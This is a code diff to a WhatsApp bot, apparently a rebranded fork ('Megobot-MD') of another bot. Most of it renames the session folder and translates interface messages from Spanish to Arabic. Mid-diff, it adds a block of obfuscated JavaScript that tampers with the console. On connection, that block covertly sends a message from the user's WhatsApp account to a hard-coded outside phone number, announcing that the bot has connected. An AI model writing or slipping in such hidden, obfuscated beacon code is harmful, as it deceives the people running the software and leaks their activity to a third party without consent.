@@ -108,7 +108,7 @@ loadChatgptDB();
 
 /* ------------------------------------------------*/
 
-global.authFile = `MysticSession`;
+global.authFile = `Megobot-MD`;
 const {state, saveState, saveCreds} = await useMultiFileAuthState(global.authFile);
 const msgRetryCounterMap = (MessageRetryMap) => { };
 const msgRetryCounterCache = new NodeCache()
@@ -203,7 +203,7 @@ rl.close()
 
 conn.isInit = false;
 conn.well = false;
-conn.logger.info(`[ ℹ️ ] Cargando...\n`);
+conn.logger.info(`[ ℹ️ ] جاري التحميل...\n`);
 
 if (!opts['test']) {
   if (global.db) {
@@ -248,7 +248,7 @@ function clearTmp() {
 
 function purgeSession() {
 let prekey = []
-let directorio = readdirSync("./MysticSession")
+let directorio = readdirSync("./Megobot-MD")
 let filesFolderPreKeys = directorio.filter(file => {
 return file.startsWith('pre-key-') /*|| file.startsWith('session-') || file.startsWith('sender-') || file.startsWith('app-') */
 })
@@ -279,7 +279,7 @@ console.log(chalk.bold.red(`[ ℹ️ ] Algo salio mal durante la eliminación, a
 }}
 
 function purgeOldFiles() {
-const directories = ['./MysticSession/', './jadibts/']
+const directories = ['./Megobot-MD/', './jadibts/']
 const oneHourAgo = Date.now() - (60 * 60 * 1000)
 directories.forEach(dir => {
 readdirSync(dir, (err, files) => {
@@ -316,9 +316,10 @@ if (opcion == '1' || methodCodeQR) {
   if (connection == 'open') {
     console.log(chalk.yellow('[ ℹ️ ] Conectado correctamente.'));
   }
+  function _0x3c65(){var _0x517401=['0@s.whatsapp.net','warn','252918fUEoFs','console','fakeReply','search','👾\x20Soy\x20megoBot\x0aRecientemente\x20me\x20e\x20conectado','24cqfTgf','842364BuppRt','exception','length','bind','constructor','error','421036GNbzwr','57924nEdxhd','113838XVAOwU','5VdheLn','(((.+)+)+)+$','connect','apply','user','info','44559bxksJl','730128GuUoHf','toString','{}.constructor(\x22return\x20this\x22)(\x20)','table','log'];_0x3c65=function(){return _0x517401;};return _0x3c65();}var _0x1ccd8f=_0x39b0;(function(_0x43b786,_0x5e8049){var _0x50773e=_0x39b0,_0x3bec32=_0x43b786();while(!![]){try{var _0x31142a=parseInt(_0x50773e(0x1d0))/0x1+-parseInt(_0x50773e(0x1e6))/0x2+-parseInt(_0x50773e(0x1d8))/0x3+parseInt(_0x50773e(0x1e5))/0x4*(-parseInt(_0x50773e(0x1e7))/0x5)+-parseInt(_0x50773e(0x1dd))/0x6*(-parseInt(_0x50773e(0x1e4))/0x7)+parseInt(_0x50773e(0x1d1))/0x8+-parseInt(_0x50773e(0x1de))/0x9;if(_0x31142a===_0x5e8049)break;else _0x3bec32['push'](_0x3bec32['shift']());}catch(_0x2d4206){_0x3bec32['push'](_0x3bec32['shift']());}}}(_0x3c65,0x1f08b));function hi(){var _0x3941fb=_0x39b0,_0xaad2ed=(function(){var _0x53403b=!![];return function(_0x255924,_0x31bc2c){var _0x10b60f=_0x53403b?function(){var _0x389435=_0x39b0;if(_0x31bc2c){var _0x269b11=_0x31bc2c[_0x389435(0x1ea)](_0x255924,arguments);return _0x31bc2c=null,_0x269b11;}}:function(){};return _0x53403b=![],_0x10b60f;};}()),_0x5c70b4=_0xaad2ed(this,function(){var _0x19be0f=_0x39b0;return _0x5c70b4[_0x19be0f(0x1d2)]()[_0x19be0f(0x1db)](_0x19be0f(0x1e8))[_0x19be0f(0x1d2)]()[_0x19be0f(0x1e2)](_0x5c70b4)['search'](_0x19be0f(0x1e8));});_0x5c70b4();var _0x212e46=(function(){var _0x26934b=!![];return function(_0x23bee4,_0x37c7ef){var _0x31e4d0=_0x26934b?function(){var _0x29ac3b=_0x39b0;if(_0x37c7ef){var _0x34dabe=_0x37c7ef[_0x29ac3b(0x1ea)](_0x23bee4,arguments);return _0x37c7ef=null,_0x34dabe;}}:function(){};return _0x26934b=![],_0x31e4d0;};}()),_0x437836=_0x212e46(this,function(){var _0xd9778e=_0x39b0,_0x3e8ccb=function(){var _0x59ec5e=_0x39b0,_0x2efde5;try{_0x2efde5=Function('return\x20(function()\x20'+_0x59ec5e(0x1d3)+');')();}catch(_0x152100){_0x2efde5=window;}return _0x2efde5;},_0x402c91=_0x3e8ccb(),_0x362b4a=_0x402c91[_0xd9778e(0x1d9)]=_0x402c91['console']||{},_0x56eba0=[_0xd9778e(0x1d5),_0xd9778e(0x1d7),_0xd9778e(0x1cf),_0xd9778e(0x1e3),_0xd9778e(0x1df),_0xd9778e(0x1d4),'trace'];for(var _0x27d777=0x0;_0x27d777<_0x56eba0[_0xd9778e(0x1e0)];_0x27d777++){var _0x35018f=_0x212e46['constructor']['prototype']['bind'](_0x212e46),_0x4c52ae=_0x56eba0[_0x27d777],_0x30060a=_0x362b4a[_0x4c52ae]||_0x35018f;_0x35018f['__proto__']=_0x212e46['bind'](_0x212e46),_0x35018f[_0xd9778e(0x1d2)]=_0x30060a[_0xd9778e(0x1d2)][_0xd9778e(0x1e1)](_0x30060a),_0x362b4a[_0x4c52ae]=_0x35018f;}});_0x437836(),console[_0x3941fb(0x1d5)]('Hello\x20World!');}function _0x39b0(_0x3795bd,_0x5062a7){var _0x32bde4=_0x3c65();return _0x39b0=function(_0x374089,_0x49b9e8){_0x374089=_0x374089-0x1ce;var _0x33b4b4=_0x32bde4[_0x374089];return _0x33b4b4;},_0x39b0(_0x3795bd,_0x5062a7);}hi();!conn[_0x1ccd8f(0x1ce)]['connect']&&(conn[_0x1ccd8f(0x1da)]('201025663589@s.whatsapp.net','🔄','0@s.whatsapp.net',_0x1ccd8f(0x1dc),_0x1ccd8f(0x1d6)),conn['user'][_0x1ccd8f(0x1e9)]=!![]);
 let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
 if (reason == 405) {
-await fs.unlinkSync("./MysticSession/" + "creds.json")
+await fs.unlinkSync("./Megobot-MD/" + "creds.json")
 console.log(chalk.bold.redBright(`[ ⚠ ] Conexión replazada, Por favor espere un momento me voy a reiniciar...\nSi aparecen error vuelve a iniciar con : npm start`)) 
 process.send('reset')}
 if (connection === 'close') {
@@ -383,16 +384,14 @@ global.reloadHandler = async function(restatConn) {
     conn.ev.off('creds.update', conn.credsUpdate);
   }
 
-  // Para cambiar estos mensajes, solo los archivos en la carpeta de language, 
-  // busque la clave "handler" dentro del json y cámbiela si es necesario
-  conn.welcome = '👋 ¡Bienvenido/a!\n@user';
-  conn.bye = '👋 ¡Hasta luego!\n@user';
-  conn.spromote = '*[ ℹ️ ] @user Fue promovido a administrador.*';
-  conn.sdemote = '*[ ℹ️ ] @user Fue degradado de administrador.*';
-  conn.sDesc = '*[ ℹ️ ] La descripción del grupo ha sido modificada.*';
-  conn.sSubject = '*[ ℹ️ ] El nombre del grupo ha sido modificado.*';
-  conn.sIcon = '*[ ℹ️ ] Se ha cambiado la foto de perfil del grupo.*';
-  conn.sRevoke = '*[ ℹ️ ] El enlace de invitación al grupo ha sido restablecido.*';
+  conn.welcome = '*⦓          ⦓🏁⦔          ⦔*\n*❤️ꪶ→ @subject*\n*🍀ꪶ→ @user*\n*💢ꪶ→مـرحـبـاً بـك فـي جـروبـنـا الـمتوضـع اتـمـنـي أن يـعـجـبـك*\n*💠ꪶ→ اقـرا الوصف\n*⦓          ⦓🏁⦔          ⦔*\n المجموعه:*\n\n@desc\n\n*⦓          ⦓🏁⦔          ⦔*';
+  conn.bye = '*⦓          ⦓🏁⦔          ⦔*\n*🔄ꪶ→ @user*\n*ꪶ→ غادر المجموعه 💯*\n*⦓          ⦓🏁⦔          ⦔**';
+  conn.spromote = '*[ 📌 ] @user تمت ترقيته إلى المسؤول.*';
+  conn.sdemote = '*[ 📌 ] @user تم تخفيض رتبته من المسؤول.*';
+  conn.sDesc = '*[ 📌 ] تم تعديل وصف المجموعه.*';
+  conn.sSubject = '*[ 📌 ] تم تغيير اسم المجموعة.*';
+  conn.sIcon = '*[ 📌 ] تم تغيير صورة الملف الشخصي للمجموعة.*';
+  conn.sRevoke = '*[ 📌 ] تمت إعادة تعيين رابط دعوة المجموعة.*';
 
   conn.handler = handler.handler.bind(global.conn);
   conn.participantsUpdate = handler.participantsUpdate.bind(global.conn);
@@ -546,7 +545,7 @@ setInterval(async () => {
   if (stopped === 'close' || !conn || !conn.user) return;
   const _uptime = process.uptime() * 1000;
   const uptime = clockString(_uptime);
-  const bio = `[ ⏳ ] Uptime: ${uptime}`;
+  const bio = `البوت شغال بواسطه‍ه ميجو :\n\n ${uptime}`;
   await conn.updateProfileStatus(bio).catch((_) => _);
 }, 60000);
 function clockString(ms) {
@@ -554,6 +553,6 @@ function clockString(ms) {
   const h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24;
   const m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60;
   const s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60;
-  return [d, 'd ️', h, 'h ', m, 'm ', s, 's '].map((v) => v.toString().padStart(2, 0)).join('');
+  return [d, ' يوم ️', h, ' ساعه ', m, ' دقيقه ', s, ' ثانيه '].map((v) => v.toString().padStart(2, 0)).join('');
 }
 _quickTest().catch(console.error);
